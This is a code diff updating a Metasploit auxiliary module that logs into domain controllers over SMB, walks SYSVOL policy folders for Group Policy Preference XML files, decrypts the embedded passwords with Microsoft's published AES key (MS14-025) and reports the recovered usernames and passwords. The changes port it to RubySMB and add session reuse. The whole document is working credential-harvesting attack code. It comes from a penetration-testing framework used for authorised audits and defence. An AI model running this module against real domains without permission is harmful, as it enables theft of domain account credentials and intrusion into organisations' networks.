@@ -1,15 +1,14 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex/parser/group_policy_preferences'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client::Authenticated
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+  include Msf::OptionalSession::SMB
 
   # Aliases for common classes
   SIMPLE = Rex::Proto::SMB::Client
@@ -22,7 +21,7 @@ class MetasploitModule < Msf::Auxiliary
       'Description' => %Q{
         This module enumerates files from target domain controllers and connects to them via SMB.
         It then looks for Group Policy Preference XML files containing local/domain user accounts
-        and passwords and decrypts them using Microsofts public AES key. This module has been
+        and passwords and decrypts them using Microsoft's public AES key. This module has been
         tested successfully on a Win2k8 R2 Domain Controller.
       },
       'Author'      =>
@@ -31,30 +30,30 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'References'    =>
         [
+          ['CVE', '2014-1812'],
           ['MSB', 'MS14-025'],
-          ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
+          ['URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/d315342d-41c0-47e3-ab96-7039eb91f5b4'],
           ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
           ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
           ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/']
         ],
-      'License'     => MSF_LICENSE
+      'License'     => MSF_LICENSE,
     )
     register_options([
       OptString.new('SMBSHARE', [true, 'The name of the share on the server', 'SYSVOL']),
-      OptString.new('RPORT', [true, 'The Target port', 445]),
+      OptPort.new('RPORT', [true, 'The Target port', 445]),
       OptBool.new('STORE', [true, 'Store the enumerated files in loot.', true])
-    ], self.class)
+    ])
   end
 
   def check_path(ip, path)
     vprint_status("Trying to download \\\\#{ip}\\#{path}...")
     begin
-      fd = simple.open("\\#{path}", 'ro')
-      fd.close
+      fd = simple.open(path, 'ro')
       print_good "Found Policy Share on #{ip}"
-      smb_download(ip, path)
-    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
-      case e.get_error(e.error_code)
+      smb_download(ip, fd, path)
+    rescue ::RubySMB::Error::UnexpectedStatusCode => e
+      case e.status_code.name
       when 'STATUS_FILE_IS_A_DIRECTORY'
         print_good("Directory FOUND: \\\\#{ip}\\#{datastore['SMBSHARE']}\\#{path}")
       when 'STATUS_OBJECT_NAME_NOT_FOUND'
@@ -68,10 +67,12 @@ class MetasploitModule < Msf::Auxiliary
       when 'STATUS_INSUFF_SERVER_RESOURCES'
         vprint_error("Host rejected with insufficient resources!")
       when 'STATUS_OBJECT_NAME_INVALID'
-        vprint_error("opening \\#{path} bad filename")
+        vprint_error("opening #{path.inspect} bad filename")
       else
-        return
+        vprint_error("Server responded unexpected status code: #{e.status_code.name.inspect}")
       end
+    ensure
+      fd.close unless fd.nil?
     end
   end
 
@@ -130,20 +131,18 @@ class MetasploitModule < Msf::Auxiliary
 
     results.each do |result|
       if datastore['STORE']
-        stored_path = store_loot('windows.gpp.xml', 'text/plain', ip, xml_file[:xml], file_type, xml_file[:path])
-        print_status("XML file saved to: #{stored_path}")
+        stored_path = store_loot('microsoft.windows.gpp', 'text/xml', ip, xml_file[:xml], file_type, xml_file[:path])
+        print_good("XML file saved to: #{stored_path}")
       end
 
       report_creds(ip, result[:USER], result[:PASS])
     end
   end
 
-  def smb_download(ip, path)
+  def smb_download(ip, fd, path)
     vprint_status("Downloading #{path}...")
 
-    fd = simple.open("\\#{path}", 'ro')
     data = fd.read
-    fd.close
 
     path_elements = path.split('\\')
     ret_obj = {
@@ -166,43 +165,42 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     print_status('Connecting to the server...')
     begin
-      connect
-      smb_login
-      print_status("Mounting the remote share \\\\#{ip}\\#{datastore['SMBSHARE']}'...")
-      simple.connect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
-
-      root_listing = simple.client.find_first("*")
-      corp_domain = ''
-      root_listing.each_key do |key|
-        next if key == '.' || key == '..'
-        corp_domain = key
+      if session
+        print_status("Using existing session #{session.sid}")
+        self.simple = session.simple_client
+        session.verify_connectivity
+      else
+        connect
+        smb_login
       end
 
-      sub_folder_listing = simple.client.find_first("#{corp_domain}\\Policies\\*")
-      sub_folders = []
-      sub_folder_listing.each_key do |key|
-        next if key == '.' ||  key == '..'
-        sub_folders << key
-      end
+      print_status("Mounting the remote share \\\\#{simple.address}\\#{datastore['SMBSHARE']}'...")
+      tree = simple.client.tree_connect("\\\\#{simple.address}\\#{datastore['SMBSHARE']}")
+
+      corp_domain = tree.list.map { |entry| entry.file_name.value.to_s.encode }.detect { |entry| entry != '.' && entry != '..' }
+      fail_with(Failure::NotFound, 'Could not find the domain folder') if corp_domain.nil?
+
+      sub_folders = tree.list(directory: "#{corp_domain}\\Policies").map { |entry| entry.file_name.value.to_s.encode }
 
       gpp_locations = %w(
-        \\MACHINE\\Preferences\\Groups\\Groups.xml
-        \\USER\\Preferences\\Groups\\Groups.xml
-        \\MACHINE\\Preferences\\Services\\Services.xml
-        \\USER\\Preferences\\Printers\\Printers.xml
-        \\USER\\Preferences\\Drives\\Drives.xml
-        \\MACHINE\\Preferences\\Datasources\\DataSources.xml
-        \\USER\\Preferences\\Datasources\\DataSources.xml
-        \\MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml
-        \\USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml
+        MACHINE\\Preferences\\Groups\\Groups.xml
+        USER\\Preferences\\Groups\\Groups.xml
+        MACHINE\\Preferences\\Services\\Services.xml
+        USER\\Preferences\\Printers\\Printers.xml
+        USER\\Preferences\\Drives\\Drives.xml
+        MACHINE\\Preferences\\Datasources\\DataSources.xml
+        USER\\Preferences\\Datasources\\DataSources.xml
+        MACHINE\\Preferences\\ScheduledTasks\\ScheduledTasks.xml
+        USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml
       )
-      sub_folders.each do |i|
+      sub_folders.each do |sub_folder|
+        next if sub_folder == '.' || sub_folder == '..'
         gpp_locations.each do |gpp_l|
-          check_path(ip,"#{corp_domain}\\Policies\\#{i}#{gpp_l}")
+          check_path(simple.address,"#{corp_domain}\\Policies\\#{sub_folder}\\#{gpp_l}")
         end
       end
     rescue ::Exception => e
-      print_error("#{rhost}: #{e.class} #{e}")
+      print_error("#{simple.address}: #{e.class} #{e}")
     ensure
       disconnect
     end
